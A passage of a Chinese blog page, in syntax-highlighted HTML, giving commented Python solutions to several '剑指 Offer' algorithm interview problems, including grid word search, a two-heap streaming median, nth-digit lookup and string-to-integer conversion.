class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exist</span><span class="params">(self, board, word)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :type word: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(board,i,j,word,k)</span>:</span></span><br><span class="line">            <span class="comment">#判断下标是否越界</span></span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">0</span> <span class="keyword">or</span> i == len(board) <span class="keyword">or</span> j &lt; <span class="number">0</span> <span class="keyword">or</span> j == len(board[<span class="number">0</span>]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment">#如果当前值和word当前值不相等，直接返回</span></span><br><span class="line">            <span class="keyword">if</span> board[i][j] != word[k]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment">#如果访问到了word最后一个值，返回True</span></span><br><span class="line">            <span class="keyword">if</span> k == len(word)<span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="comment">#先将当前值置空，防止后面重复访问</span></span><br><span class="line">            board[i][j] = <span class="string">''</span></span><br><span class="line">            res = dfs(board, i<span class="number">-1</span>, j, word, k+<span class="number">1</span>) <span class="keyword">or</span> dfs(board, i, j<span class="number">-1</span>, word, k+<span class="number">1</span>) \</span><br><span class="line">            <span class="keyword">or</span> dfs(board, i+<span class="number">1</span>, j, word, k+<span class="number">1</span>) <span class="keyword">or</span> dfs(board, i, j+<span class="number">1</span>, word, k+<span class="number">1</span>)</span><br><span class="line">            board[i][j] = word[k]</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(board)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(board[i])):</span><br><span class="line">                <span class="keyword">if</span> dfs(board,i,j,word,<span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-41-数据流中的中位数-hard"><a href="#剑指-Offer-41-数据流中的中位数-hard" class="headerlink" title="剑指 Offer 41. 数据流中的中位数(hard)"></a>剑指 Offer 41. 数据流中的中位数(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> heapq <span class="keyword">import</span> *</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MedianFinder</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 菜鸡的数组排序做法</span></span><br><span class="line">    <span class="comment"># def __init__(self):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     initialize your data structure here.</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res=[]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># def addNum(self, num):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     :type num: int</span></span><br><span class="line">    <span class="comment">#     :rtype: None</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res.append(num)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># def findMedian(self):</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     :rtype: float</span></span><br><span class="line">    <span class="comment">#     """</span></span><br><span class="line">    <span class="comment">#     self.res=sorted(self.res)</span></span><br><span class="line">    <span class="comment">#     if len(self.res)%2:</span></span><br><span class="line">    <span class="comment">#         return self.res[len(self.res)/2]</span></span><br><span class="line">    <span class="comment">#     else:</span></span><br><span class="line">    <span class="comment">#         return (self.res[len(self.res)/2-1]+self.res[len(self.res)/2])/2.0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#大佬的堆解法</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#heapq默认小顶堆</span></span><br><span class="line">        self.A = [] <span class="comment"># 小顶堆，保存较大的一半</span></span><br><span class="line">        <span class="comment">#实现大顶堆进堆的时候取相反数</span></span><br><span class="line">        self.B = [] <span class="comment"># 大顶堆，保存较小的一半</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="comment"># 如果不相等，说明A多了一个</span></span><br><span class="line">        <span class="comment"># 把当前数存到A，调整堆之后，返回A中的最小值给B</span></span><br><span class="line">        <span class="keyword">if</span> len(self.A) != len(self.B):</span><br><span class="line">            heappush(self.B, -heappushpop(self.A, num))</span><br><span class="line">        <span class="comment"># 如果相等，就把当前数给B，调整堆之后，返回B中的最大值给A</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            heappush(self.A, -heappushpop(self.B, -num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedian</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 如果是奇数，直接返回A中的最小值</span></span><br><span class="line">        <span class="comment"># 如果是偶数，则返回两者堆顶的平均值</span></span><br><span class="line">        <span class="comment"># print(self.A)</span></span><br><span class="line">        <span class="comment"># print(self.B)</span></span><br><span class="line">        <span class="keyword">return</span> self.A[<span class="number">0</span>] <span class="keyword">if</span> len(self.A) != len(self.B) <span class="keyword">else</span> (self.A[<span class="number">0</span>] - self.B[<span class="number">0</span>]) / <span class="number">2.0</span></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="comment"># Your MedianFinder object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = MedianFinder()</span></span><br><span class="line"><span class="comment"># obj.addNum(num)</span></span><br><span class="line"><span class="comment"># param_2 = obj.findMedian()</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-13-机器人的运动范围-medium"><a href="#剑指-Offer-13-机器人的运动范围-medium" class="headerlink" title="剑指 Offer 13. 机器人的运动范围(medium)"></a>剑指 Offer 13. 机器人的运动范围(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">movingCount</span><span class="params">(self, m, n, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(i,j,k)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span>&lt;= i &lt;m <span class="keyword">or</span> <span class="keyword">not</span> <span class="number">0</span>&lt;= j &lt;n <span class="keyword">or</span> (i,j) <span class="keyword">in</span> a <span class="keyword">or</span> (i%<span class="number">10</span>+i//<span class="number">10</span>+j%<span class="number">10</span>+j//<span class="number">10</span>)&gt;k: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="comment">#把这个点加入到访问集合中</span></span><br><span class="line">            a.add((i,j))</span><br><span class="line">            <span class="comment">#因为从（0,0）开始，所以只要向下走或向右走就行</span></span><br><span class="line">            dfs(i+<span class="number">1</span>,j,k)</span><br><span class="line">            dfs(i,j+<span class="number">1</span>,k) </span><br><span class="line">        a = set()</span><br><span class="line">        dfs(<span class="number">0</span>,<span class="number">0</span>,k)</span><br><span class="line">        <span class="keyword">return</span> len(a)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-44-数字序列中某一位的数字-medium"><a href="#剑指-Offer-44-数字序列中某一位的数字-medium" class="headerlink" title="剑指 Offer 44. 数字序列中某一位的数字(medium)"></a>剑指 Offer 44. 数字序列中某一位的数字(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findNthDigit</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        temp=<span class="number">0</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        如果n大于9的话，判断n应该在哪个区间</span></span><br><span class="line"><span class="string">        因为1位数一共有9个</span></span><br><span class="line"><span class="string">        2位数有90*2=180个</span></span><br><span class="line"><span class="string">        3位数有900*3=2700个</span></span><br><span class="line"><span class="string">        因此我们可以知道n位数有9*(10**(i-1)*i)个</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;num:</span><br><span class="line">            temp = num <span class="comment">#temp保存上一个num的数</span></span><br><span class="line">            addnum = <span class="number">9</span>*(<span class="number">10</span>**i)*(i+<span class="number">1</span>)</span><br><span class="line">            num+=addnum</span><br><span class="line">            i+=<span class="number">1</span></span><br><span class="line">        res = n-temp <span class="comment">#减去区间之前的那些数</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        此时得到的i如果是3，则说明从三位数开始</span></span><br><span class="line"><span class="string">        可以得到区间在100-1000之间</span></span><br><span class="line"><span class="string">        从而算得起始的数是10**(3-1)=100</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        start_num = <span class="number">10</span>**(i<span class="number">-1</span>)</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        因为在这个区间每一个数都是i位，因此我们得到除数div</span></span><br><span class="line"><span class="string">        对于三位数来讲，如果除数div=10，则可以得到数字是在100+10-1=109附近</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        div = res / i</span><br><span class="line">        mod = res % i</span><br><span class="line">        new_num = start_num + div - <span class="number">1</span> <span class="comment">#这个数字就是区间内加上除数之后的数字</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        进一步通过余数判断，如果余数为0，则说明当前得到的数字的最后一个数字就是结果</span></span><br><span class="line"><span class="string">        如果余数不为0，则说明最终结果在下一个数字，从而根据余数得到最终结果</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> mod == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> int(str(new_num)[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> int(str(new_num+<span class="number">1</span>)[mod - i - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#第一种方法，超时了</span></span><br><span class="line">        <span class="comment"># s=0</span></span><br><span class="line">        <span class="comment"># for i in range(n+1):</span></span><br><span class="line">        <span class="comment">#     s+=len(str(i))</span></span><br><span class="line">        <span class="comment">#     if s&gt;=n+1:</span></span><br><span class="line">        <span class="comment">#         return int(str(i)[n-temp])</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-33-二叉搜索树的后序遍历序列-medium"><a href="#剑指-Offer-33-二叉搜索树的后序遍历序列-medium" class="headerlink" title="剑指 Offer 33. 二叉搜索树的后序遍历序列(medium)"></a>剑指 Offer 33. 二叉搜索树的后序遍历序列(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verifyPostorder</span><span class="params">(self, postorder)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type postorder: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(postorder) == <span class="number">1</span> <span class="keyword">or</span> (<span class="keyword">not</span> postorder):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        root = postorder[<span class="number">-1</span>] <span class="comment">#后序遍历最后一个值为根结点</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(postorder)): <span class="comment">#找到根节点右子树的第一个值</span></span><br><span class="line">            <span class="keyword">if</span> postorder[i]&gt;=root:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        left = postorder[:i] <span class="comment">#划分左子树</span></span><br><span class="line">        right = postorder[i:len(postorder)<span class="number">-1</span>] <span class="comment">#划分右子树</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> left: <span class="comment">#如果左子树中有小于根的，直接return </span></span><br><span class="line">            <span class="keyword">if</span> i&gt;root:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> right: <span class="comment">#如果右子树中有小于根的，直接return </span></span><br><span class="line">            <span class="keyword">if</span> i&lt;root:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        left = self.verifyPostorder(left) <span class="comment">#递归判断左子树</span></span><br><span class="line">        right = self.verifyPostorder(right) <span class="comment">#递归判断右子树</span></span><br><span class="line">        <span class="keyword">if</span> left <span class="keyword">and</span> right:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-16-数值的整数次方-medium"><a href="#剑指-Offer-16-数值的整数次方-medium" class="headerlink" title="剑指 Offer 16. 数值的整数次方(medium)"></a>剑指 Offer 16. 数值的整数次方(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myPow</span><span class="params">(self, x, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type x: float</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: float</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>/x * self.myPow(<span class="number">1</span>/x,-n<span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">if</span> n%<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> x * self.myPow(x*x,n/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> n%<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> self.myPow(x*x,n/<span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-67-把字符串转换成整数-medium"><a href="#剑指-Offer-67-把字符串转换成整数-medium" class="headerlink" title="剑指 Offer 67. 把字符串转换成整数(medium)"></a>剑指 Offer 67. 把字符串转换成整数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">strToInt</span><span class="params">(self, str)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type str: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        str = list(str.lstrip())  <span class="comment"># 去掉开头多余的空格</span></span><br><span class="line">        num = [<span class="string">'0'</span>, <span class="string">'1'</span>,<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>]</span><br><span class="line">        <span class="keyword">if</span> len(str)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len(str)==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> str[<span class="number">0</span>] <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">return</span> int(str[<span class="number">0</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">            <span class="keyword">if</span> str[i] != <span class="string">"-"</span> <span class="keyword">and</span> str[i] != <span class="string">"+"</span> <span class="keyword">and</span> str[i] <span class="keyword">not</span> <span class="keyword">in</span> num:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> str[i] == <span class="string">'-'</span> <span class="keyword">or</span> str[i] == <span class="string">'+'</span>: <span class="comment">#处理以‘-’和‘+’开头的</span></span><br><span class="line">                temp=str[i] <span class="comment">#保存‘+-’符号</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> str[i] <span class="keyword">not</span> <span class="keyword">in</span> num:</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">                        <span class="keyword">if</span> str[i] <span class="keyword">in</span> num:</span><br><span class="line">                            res *= <span class="number">10</span></span><br><span class="line">                            res += int(str[i])</span><br><span class="line">                            i += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>: <span class="comment">#如果第i个字符不是数字直接退出</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">if</span> temp == <span class="string">'-'</span>:</span><br><span class="line">                        <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">                            <span class="keyword">return</span> -pow(<span class="number">2</span>,<span class="number">31</span>)</span><br><span class="line">                        <span class="keyword">return</span> -res</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span>:</span><br><span class="line">                            <span class="keyword">return</span> pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">                        <span class="keyword">return</span> res</span><br><span class="line">            <span class="keyword">elif</span> str[i] <span class="keyword">in</span> num: <span class="comment">#处理以字母开头的</span></span><br><span class="line">                <span class="keyword">while</span> i &lt; len(str):</span><br><span class="line">                        <span class="keyword">if</span> str[i] <span class="keyword">in</span> num:</span><br><span class="line">                            res *= <span class="number">10</span></span><br><span class="line">                            res += int(str[i])</span><br><span class="line">                            i += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> res&gt;pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span>:</span><br><span class="line">                    <span class="keyword">return</span> pow(<span class="number">2</span>,<span class="number">31</span>)<span class="number">-1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-46-把数字翻译成字符串-medium"><a href="#剑指-Offer-46-把数字翻译成字符串-medium" class="headerlink" title="剑指 Offer 46. 把数字翻译成字符串(medium)"></a>剑指 Offer 46. 把数字翻译成字符串(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">translateNum</span><span class="params">(self, num)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type num: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">10</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> num%<span class="number">100</span>&lt;<span class="number">10</span> <span class="keyword">or</span> num%<span class="number">100</span>&gt;<span class="number">25</span>:</span><br><span class="line">            <span class="keyword">return</span> self.translateNum(num/<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> (self.translateNum(num/<span class="number">10</span>)+self.translateNum(num/<span class="number">100</span>))</span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-14-II-剪绳子-II-medium"><a href="#剑指-Offer-14-II-剪绳子-II-medium" class="headerlink" title="剑指 Offer 14- II. 剪绳子 II(medium)"></a>剑指 Offer 14- II. 剪绳子 II(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cuttingRope</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        尽可能分成长度为3的</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> n&lt;=<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> n<span class="number">-1</span></span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n&gt;<span class="number">4</span>:</span><br><span class="line">            res*=<span class="number">3</span></span><br><span class="line">            n-=<span class="number">3</span></span><br><span class="line">        <span class="keyword">return</span> (res*n)% <span class="number">1000000007</span></span><br></pre></td></tr></table></figure><h4 id="剑指-Offer-66-构建乘积数组-medium"><a href="#剑指-Offer-66-构建乘积数组-medium" class="headerlink" title="剑指 Offer 66. 构建乘积数组(medium)"></a>剑指 Offer 66. 构建乘积数组(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 